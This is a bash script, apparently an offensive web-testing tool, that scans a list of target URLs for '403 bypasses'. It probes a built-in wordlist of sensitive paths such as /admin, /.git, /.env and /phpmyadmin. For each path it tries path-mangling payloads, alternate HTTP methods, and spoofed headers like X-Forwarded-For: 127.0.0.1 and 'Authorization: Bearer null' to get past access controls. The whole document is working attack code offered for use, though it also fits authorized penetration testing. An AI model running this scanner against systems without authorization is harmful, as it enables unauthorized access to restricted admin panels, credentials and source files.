#!/bin/bash

# 403 Bypass Scanner with extended paths
# Usage: ./403bypass_paths.sh urls.txt [optional_paths.txt]

targets_file=$1
paths_file=$2

if [[ -z "$targets_file" ]]; then
    echo "Usage: $0 targets.txt [paths.txt]"
    exit 1
fi

# If custom paths not provided, use built-in extended wordlist
if [[ -z "$paths_file" ]]; then
    paths_file="/tmp/paths_default.txt"
    cat > "$paths_file" <<'EOF'
/admin
/administrator
/admin-console
/adminpanel
/admin_area
/admin1
/admin2
/admin3
/login
/dashboard
/portal
/console
/config
/configuration
/conf
/settings
/internal
/secure
/private
/hidden
/.git
/.env
/.htaccess
/server-status
/api
/api/v1
/api/v2
/v1/internal
/v2/internal
/api/private
/api/admin
/.svn
/.DS_Store
/uploads
/files
/backup
/backups
/db
/database
/phpmyadmin
/webadmin
/cp
/cpanel
/secret
/restricted
/protected
/debug
/test
/tmp
/stage
/staging
/preprod
/preproduction
/dev
/development
EOF
fi

# Methods, payloads, and headers
declare -a methods=("GET" "POST" "PUT" "TRACE" "OPTIONS")
declare -a bypass_payloads=("/" "/." "//" "/%2e/" "/;/")
declare -a headers=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "Authorization: Bearer null"
  "Authorization: Bearer test"
  "X-HTTP-Method-Override: PUT"
)

while read -r url; do
  [[ -z "$url" ]] && continue
  echo -e "\n=== Testing $url ==="

  while read -r basepath; do
    [[ -z "$basepath" ]] && continue

    for bp in "${bypass_payloads[@]}"; do
      full="$url$basepath$bp"
      code=$(curl -sk -o /dev/null -w "%{http_code}" "$full")
      echo "[PATH] $full --> $code"
    done

    for m in "${methods[@]}"; do
      code=$(curl -sk -o /dev/null -w "%{http_code}" -X $m "$url$basepath")
      echo "[METHOD] $m $url$basepath --> $code"
    done

    for h in "${headers[@]}"; do
      code=$(curl -sk -o /dev/null -w "%{http_code}" -H "$h" "$url$basepath")
      echo "[HEADER] $h on $url$basepath --> $code"
    done

  done < "$paths_file"
done < "$targets_file"
